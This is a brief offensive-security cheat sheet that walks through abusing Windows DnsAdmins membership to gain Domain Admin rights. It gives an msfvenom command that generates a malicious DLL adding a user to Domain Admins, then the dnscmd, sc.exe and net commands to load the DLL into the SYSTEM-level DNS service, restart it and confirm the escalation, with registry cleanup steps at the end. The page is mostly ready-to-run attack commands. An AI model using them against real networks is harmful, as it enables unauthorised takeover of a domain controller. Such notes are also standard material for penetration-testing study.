# DnsAdmins

## <mark style="color:yellow;">About</mark>

Members of the <mark style="color:red;">**DnsAdmins**</mark> group can <mark style="color:purple;">**access DNS information within the network**</mark>. The Windows DNS service allows <mark style="color:yellow;">**custom plugins**</mark>, which can execute functions to resolve name queries beyond the locally hosted DNS zones. Since the DNS service operates with <mark style="color:green;">`NT AUTHORITY\SYSTEM`</mark> privileges, being part of this group could be exploited to escalate privileges on a Domain Controller or a dedicated DNS server for the domain. The built-in **dnscmd** utility can be used to define the path of the plugin DLL.

## <mark style="color:yellow;">Importing custom plugin</mark>

### <mark style="color:blue;">Generating malicious dll</mark>

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" ven17 /add /domain' -f dll -o adduser.dll
```

### <mark style="color:blue;">Starting local HTTP server</mark>

```bash
python3 -m http.server 1337
```

### <mark style="color:blue;">**Loading DLL**</mark>

<mark style="color:orange;">**You should be DnsAdmins group member!**</mark>

```powershell
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\ven17\Desktop\adduser.dll
```

* If successful: <mark style="color:green;">`Registry property serverlevelplugindll successfully reset.`</mark>

### <mark style="color:blue;">Restart DNS Service</mark>

<pre class="language-sh"><code class="lang-sh"><strong>C:\> sc.exe stop dns
</strong>C:\> sc.exe start dns
</code></pre>

### <mark style="color:blue;">Confirm Admin Privileges</mark>

```sh
PS C:\> net group "Domain Admins" /dom
```

## <mark style="color:yellow;">Cleanup</mark>

### <mark style="color:blue;">**Confirming Registry Key Added**</mark>

```powershell
C:\> reg query \\13.13.13.13\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

### <mark style="color:blue;">Delete Registry Key</mark>

```powershell
C:\> reg delete \\13.13.13.13\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

### <mark style="color:blue;">Restart DNS Service</mark>

```powershell
C:\> sc.exe start dns
C:\> sc query dns
```
